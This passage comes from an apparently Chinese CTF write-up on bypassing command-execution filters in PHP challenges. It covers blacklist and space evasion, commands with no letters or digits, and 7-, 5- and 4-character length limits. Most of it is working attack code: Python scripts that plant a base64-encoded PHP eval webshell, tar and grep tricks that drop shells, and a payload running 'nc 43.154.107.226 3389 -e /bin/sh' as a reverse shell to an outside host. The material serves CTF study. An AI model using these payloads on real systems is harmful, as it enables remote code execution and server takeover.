-f</code><br>常见的列目录的命令：<code>ls</code>,<code>du</code><br>常用的还有通配符<code>*</code>和<code>?</code></p><p>黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字</p><p>比如<br><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p><h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><p>符号过滤也非常常见</p><p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p><p>再者，可以利用变量来截取</p><p>比如通过<code>env</code>命令获取到了如下变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure><p>可以通过<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>或者<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>表示空格</p><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个文件上传网页，强制上传，利用<code>?</code>匹配文件来rce</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包爆破，用<code>[@-[]</code>来匹配大写字母，可以增加读到的概率</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/wuzimushuzi1.png"></p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><h4 id="7字符长度的命令执行"><a href="#7字符长度的命令执行" class="headerlink" title="7字符长度的命令执行"></a>7字符长度的命令执行</h4><h5 id="web目录可写"><a href="#web目录可写" class="headerlink" title="web目录可写"></a>web目录可写</h5><p>可写的情况主要利用<code>&gt;</code>写入shell到文件名中，然后利用<code>ls -t</code>命令排序，写入文件后用<code>.</code>执行。具体思路如下</p><p>在<code>linux</code>中，可以利用<code>&gt;aa</code>创建一个文件，文件名就是<code>aa</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-1.png"></p><p>执行一次<code>ls -t&gt;0</code>，然后<code>cat 0</code>，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-3.png"></p><p>为了避免符号的原因导致写入失败，先把一句话木马转成base64形式<br><code>&lt;?php eval($_GET[1]);</code></p><p><code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p><p><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p><p>然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个<code>\</code>，在linux中表示一行未输入完</p><p>最后<code>0</code>文件中应该是如下内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-2.png"></p><p>执行<code>. 0</code>，就会生成一个<code>1.php</code></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:01</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;.1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="web目录不可写"><a href="#web目录不可写" class="headerlink" title="web目录不可写"></a>web目录不可写</h5><p>既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录<code>/tmp/</code></p><p>这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用<code>. /t*/*</code>匹配我们上传的文件并执行，刚好7个字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-4.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:10</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getShell</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>file = &#123;<br><span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;</span><br>&#125;<br>requests.post(url,data=data,files=file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>getShell(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="5字符长度的命令执行"><a href="#5字符长度的命令执行" class="headerlink" title="5字符长度的命令执行"></a>5字符长度的命令执行</h4><h5 id="环境有dir"><a href="#环境有dir" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路：<br>1：将<code>index.php</code>转为<code>.php</code><br>2：将临时文件打包到当前目录<br>3：使用php执行tar压缩包</p><p>第一步的操作与7字符可写差不多，主要是为了<code>index.php</code>这个文件名不影响后面的排序</p><p>先复制一份<code>index.php</code>的内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-1.png"></p><p>然后通过<code>cp</code>，<code>rev</code>，<code>dir</code>等命令将<code>index.php</code>转化为了<code>php.xedni</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-2.png"></p><p>先将多余的文件删除，再利用shell中的注释符<code>#</code>，成功得到<code>.php</code>文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-3.png"></p><p>删去多余的文件，创建<code>tar</code>命令和<code>vcf</code>参数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-4.png"></p><p>强制上传一个文件到php的文件缓存目录<code>/tmp/xxxx</code>，内容是<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;</code></p><p>然后最关键的命令来了，使用<code>* /t*</code>打包恶意文件到<code>z</code>，实际上执行的是<code>tar vcf z /tmp/*</code></p><p>最后使用<code>php z</code>命令写入shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-5.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;</span><br>url_2 = url+<span class="hljs-string">&quot;.php&quot;</span><br>delay = <span class="hljs-number">1</span><br><br>chagneFile_payload=[<br><span class="hljs-string">&#x27;&gt;cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k&#x27;</span>,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br><span class="hljs-string">&#x27;rm cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;pc&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;rm v&#x27;</span>,<br><span class="hljs-string">&#x27;rm k&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span>,<br><span class="hljs-string">&#x27;rm pc&#x27;</span>,<br><span class="hljs-string">&#x27;rm *v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php.&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vm&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span><br>]<br><br>clearFile_payload=[<br><span class="hljs-string">&#x27;rm d*&#x27;</span>,<br><span class="hljs-string">&#x27;rm j*&#x27;</span>,<br><span class="hljs-string">&#x27;rm p*&#x27;</span>,<br><span class="hljs-string">&#x27;rm r*&#x27;</span>,<br><span class="hljs-string">&#x27;rm v*&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span><br>]<br><br>shell_payload=[<br><span class="hljs-string">&#x27;&gt;tar&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vcf&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;z&#x27;</span><br>]<br><br>file=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> chagneFile_payload:<br>sendPayload(url,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clearFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> clearFile_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> shell_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;* /t*&quot;</span><br>&#125;<br>requests.post(url_2,data=data,files=file)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;php z&quot;</span><br>&#125;<br>requests.post(url_2,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkShell</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendPayload</span>(<span class="hljs-params">url,payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>changeFile()<br>clearFile()<br>getshell()<br>checkShell()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir"><a href="#环境无dir" class="headerlink" title="环境无dir"></a>环境无dir</h5><p><code>dir</code>与<code>ls</code>最大的区别就是<code>dir</code>没有换行</p><p>这题主要思路是利用<code>grep</code>命令修改题目，可以说是非常巧妙了</p><p>具体步骤如下:</p><p>写入<code>grep</code>和<code>h</code>，接着<code>*</code>执行，实际上就是拿出题目中包含<code>h</code>的每一行，恰好<code>if(strlen($cmd) &lt;= 5)</code>是没有<code>h</code>的，这样就没有限制了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-6.png"></p><p>将修改后的代码追加到<code>i</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-7.png"></p><p><code>cp</code>到<code>index.php</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-8.png"></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:28</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;grep&quot;</span>,<br><span class="hljs-string">&quot;&gt;h&quot;</span>,<br><span class="hljs-string">&quot;*&gt;j&quot;</span>,<br><span class="hljs-string">&quot;rm g*&quot;</span>,<br><span class="hljs-string">&quot;rm h*&quot;</span>,<br><span class="hljs-string">&quot;&gt;cat&quot;</span>,<br><span class="hljs-string">&quot;*&gt;&gt;i&quot;</span>,<br><span class="hljs-string">&quot;rm c*&quot;</span>,<br><span class="hljs-string">&quot;rm j&quot;</span>,<br><span class="hljs-string">&quot;&gt;cp&quot;</span>,<br><span class="hljs-string">&quot;*&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="4字符长度的命令执行"><a href="#4字符长度的命令执行" class="headerlink" title="4字符长度的命令执行"></a>4字符长度的命令执行</h4><h5 id="环境有dir-1"><a href="#环境有dir-1" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路和7字符可写差不多，拼接出<code>ls -t</code>命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题</p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 